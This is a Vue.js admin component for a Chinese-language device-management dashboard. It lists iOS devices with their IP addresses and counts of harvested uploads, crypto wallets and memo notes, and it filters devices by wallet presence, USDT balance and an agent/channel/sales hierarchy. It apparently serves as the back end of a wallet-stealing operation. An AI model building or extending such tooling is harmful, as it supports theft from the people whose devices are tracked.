<template>
  <div>
    <div class="devices-head">
      <h1>设备管理</h1>
      <div class="rule"></div>
    </div>
    <div class="devices-stats">
      <span>{{ stats.deviceCount || 0 }} DEVICES</span>
      <span class="stat-active"><span class="dot dot-active"></span> {{ stats.busyCount || 0 }} 进行中</span>
      <span class="stat-done"><span class="dot dot-done"></span> {{ stats.doneCount || 0 }} 已结束</span>
      <span>{{ stats.uploadCount || 0 }} UPLOADS</span>
      <span>{{ stats.walletCount || 0 }} WALLETS</span>
      <span>{{ stats.notesCount || 0 }} NOTES</span>
    </div>
    <form class="devices-filters" @submit.prevent="search">
      <select v-model="filters.has_wallet">
        <option value="">钱包 · 全部</option>
        <option value="1">有钱包</option>
        <option value="0">无钱包</option>
      </select>
      <select v-model="filters.min_usdt">
        <option value="">USDT · 全部</option>
        <option value="10">USDT &gt; 10</option>
      </select>
      <input v-model="filters.device_id" placeholder="设备 ID" maxlength="64" />
      <input v-model="filters.ios" placeholder="系统版本" maxlength="32" />
      <input v-model="filters.appid" placeholder="AppID" maxlength="64" />
      <select v-model="filters.agent_id">
        <option value="">归属代理</option>
        <option v-for="a in agents" :key="a.id" :value="String(a.id)">{{ a.display_name || a.displayName }}</option>
      </select>
      <select v-model="filters.channel_id" :disabled="!filters.agent_id">
        <option value="">归属渠道</option>
        <option v-for="c in channelsOf(filters.agent_id)" :key="c.id" :value="String(c.id)">{{ c.display_name || c.displayName }}</option>
      </select>
      <select v-model="filters.sales_id" :disabled="!filters.channel_id">
        <option value="">归属业务</option>
        <option v-for="s in salesOf(filters.channel_id)" :key="s.id" :value="String(s.id)">{{ s.display_name || s.displayName }}</option>
      </select>
      <button type="submit" class="btn-filter-search">查询</button>
      <button type="button" class="btn-filter-reset" @click="reset">重置</button>
    </form>
    <div class="devices-table-card">
      <div v-if="!items.length" class="devices-empty">暂无设备数据</div>
      <table v-else class="devices-table">
        <thead>
          <tr>
            <th class="col-id">ID</th>
            <th>设备</th>
            <th class="col-owner">归属</th>
            <th>状态</th>
            <th class="col-data">数据</th>
            <th>最近活动</th>
            <th>操作</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="d in items" :key="d.deviceId" class="dv-row" @click="$router.push('/devices/' + d.deviceId)">
            <td class="col-id"><span class="dv-row-id">{{ d.id }}</span></td>
            <td>
              <div class="dv-name"><span>{{ d.deviceName || "—" }}</span></div>
              <div class="dv-sub"><span>{{ d.model || d.hardwareModel || "—" }}</span><span>{{ d.iosVersion || "" }}</span></div>
              <div class="dv-id">{{ d.appDisplayName || d.appName || d.deviceId }}</div>
            </td>
            <td class="col-owner">
              <div class="dv-owner">{{ d.ownerLabel || "—" }}</div>
              <div class="dv-ip">{{ d.ip || "—" }}</div>
            </td>
            <td>
              <span v-if="!d.finished" class="badge badge-busy"><span class="dot"></span>进行中</span>
              <span v-else class="badge badge-muted"><span class="dot"></span>已结束</span>
            </td>
            <td class="col-data">
              <div class="dv-metrics">
                <div class="dv-metric"><b>{{ d.uploadCount }}</b><span>上传</span></div>
                <div class="dv-metric"><b>{{ d.walletCount }}</b><span>钱包</span></div>
                <div class="dv-metric"><b>{{ d.notesCount }}</b><span>备忘录</span></div>
              </div>
            </td>
            <td>
              <div class="dv-time">{{ d.activityLabel }}</div>
              <div class="dv-time-sub">{{ d.updatedLabel }}</div>
            </td>
            <td><router-link class="btn-dv-detail" :to="'/devices/' + d.deviceId" @click.stop>详情</router-link></td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class="vue-pager" v-if="total">
      <div>第 {{ page + 1 }} / {{ totalPages || 1 }} 页 · 共 {{ total }} 台</div>
      <div class="links">
        <button :disabled="page <= 0" @click="go(page - 1)">上一页</button>
        <button :disabled="page + 1 >= totalPages" @click="go(page + 1)">下一页</button>
      </div>
    </div>
  </div>
</template>
<script>
import { api } from "../api/http";
import { toast } from "../utils/ui";

export default {
  data() {
    return {
      stats: {},
      items: [],
      page: 0,
      size: 10,
      total: 0,
      totalPages: 0,
      filters: { has_wallet: "", min_usdt: "", device_id: "", ios: "", appid: "", agent_id: "", channel_id: "", sales_id: "" },
      hierarchy: { agents: [], channels: [], sales: [] },
      timer: null,
    };
  },
  computed: {
    agents() { return this.hierarchy.agents || []; },
  },
  watch: {
    "filters.agent_id"() { this.filters.channel_id = ""; this.filters.sales_id = ""; },
    "filters.channel_id"() { this.filters.sales_id = ""; },
  },
  mounted() {
    this.reload();
    this.timer = setInterval(() => this.reload(true), 8000);
  },
  beforeUnmount() {
    clearInterval(this.timer);
  },
  methods: {
    async reload(silent) {
      try {
        const [sum, list] = await Promise.all([
          api.summary(),
          api.devices({ page: this.page, size: this.size, ...this.filters }),
        ]);
        this.stats = sum.data || {};
        const data = list.data || {};
        this.items = data.items || [];
        this.total = data.total || 0;
        this.totalPages = data.totalPages || 0;
        this.page = data.page || 0;
        this.hierarchy = data.owner_hierarchy || this.hierarchy;
      } catch (e) {
        if (!silent) toast(e.message, "err");
      }
    },
    search() {
      this.page = 0;
      this.reload();
    },
    reset() {
      this.filters = { has_wallet: "", min_usdt: "", device_id: "", ios: "", appid: "", agent_id: "", channel_id: "", sales_id: "" };
      this.search();
    },
    go(p) {
      this.page = p;
      this.reload();
    },
    channelsOf(agentId) {
      if (!agentId) return [];
      return (this.hierarchy.channels || []).filter((c) => String(c.parent_id || c.parentId) === String(agentId));
    },
    salesOf(channelId) {
      if (!channelId) return [];
      return (this.hierarchy.sales || []).filter((s) => String(s.parent_id || s.parentId) === String(channelId));
    },
  },
};
</script>
